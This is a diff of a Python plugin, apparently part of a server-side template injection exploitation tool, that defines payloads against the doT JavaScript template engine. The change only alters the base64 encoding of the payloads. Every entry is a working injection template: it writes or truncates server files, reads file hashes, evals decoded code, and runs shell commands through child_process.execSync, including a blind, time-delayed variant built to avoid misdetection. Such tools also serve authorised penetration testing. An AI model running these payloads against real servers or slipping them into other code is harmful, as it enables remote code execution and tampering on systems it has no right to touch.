@@ -16,7 +16,7 @@ class Dot(javascript.Javascript):
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64url'), 'binary')}}}}""",
+                'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')}}}}""",
                 'truncate': """{{{{=global.process.mainModule.require('fs').writeFileSync('{path}', '')}}}}"""
             },
             'read': {
@@ -28,17 +28,17 @@ class Dot(javascript.Javascript):
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex");"""
             },
             'evaluate': {
-                'evaluate': """{{{{=eval(Buffer('{code_b64}', 'base64url').toString())}}}}""",
+                'evaluate': """{{{{=eval(Buffer('{code_b64p}', 'base64').toString())}}}}""",
                 'test_os': """global.process.mainModule.require('os').platform()""",
             },
             'execute': {
                 'call': 'evaluate',
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString());"""
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString());"""
             },
             'execute_blind': {
                 # The bogus prefix is to avoid false detection of Javascript instead of doT
                 'call': 'inject',
-                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}');}}}}"""
+                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');}}}}"""
             },
         })
 
